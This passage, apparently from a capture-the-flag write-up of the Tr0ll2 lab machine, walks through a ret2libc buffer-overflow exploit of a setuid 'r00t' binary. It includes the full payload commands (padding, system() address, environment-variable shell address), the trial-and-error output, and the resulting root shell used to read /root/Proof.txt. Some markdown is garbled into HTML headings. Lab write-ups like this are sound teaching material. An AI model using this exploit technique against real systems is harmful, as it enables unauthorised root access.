<p>noob@Tr0ll2:/tmp$ ./r00t $(python -c &lsquo;print &ldquo;A&rdquo; *268 + &ldquo;\x60\xb0\xe6\xb7&rdquo; + &ldquo;JUNK&rdquo; + &ldquo;\x05\xff\xff\xbf&rdquo;&rsquo;)
sh: 1: =/bin/sh: not found
Segmentation fault</p>

<h1>another segfault, however we have a little diagnostics message now</h1>

<h1>showing that we are not far off :)</h1>

<p>noob@Tr0ll2:/tmp$ ./r00t $(python -c &lsquo;print &ldquo;A&rdquo; *268 + &ldquo;\x60\xb0\xe6\xb7&rdquo; + &ldquo;JUNK&rdquo; + &ldquo;\x06\xff\xff\xbf&rdquo;&rsquo;)
$
```</p>

<h2>trollin the rootin</h2>

<p>So <code>0xbfffff06</code> as a EGG location will give us shell in our testing! To finish off then, I have to find the correct <code>r00t</code> binary in all of the <code>door{1,2,3}</code> folders and attempt my exploit there:</p>

<p><code>bash
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" *268 + "\x60\xb0\xe6\xb7" + "JUNK" + "\x06\xff\xff\xbf"')
sh: 1: in:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games: not found
Segmentation fault
</code></p>

<p>Another segmentation fault! This time we seem to be waaaaaaaay off too. This is because of the <code>PWD</code> changing so drastically. To fix this, we simply rerun our <code>findegg</code> program and compensate for the binary name. When completing this, I had a successful run as follows:</p>

<p>```bash
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c &lsquo;print &ldquo;A&rdquo; *268 + &ldquo;\x60\xb0\xe6\xb7&rdquo; + &ldquo;JUNK&rdquo; + &ldquo;\xe2\xfe\xff\xbf&rdquo;&rsquo;)</p>

<h1>id</h1>

<p>uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
```</p>

<p>This time I had to move the memory location for for my EGG on by quite a few bytes, in fact from <code>0xbffffeda</code> all the way to <code>0xbffffee2</code></p>

<p>As I was now root, I may cat the <code>Proof.txt</code> in <code>/root</code></p>

<p>```bash</p>

<h1>cat /root/Proof.txt</h1>

<p>You win this time young Jedi&hellip;</p>
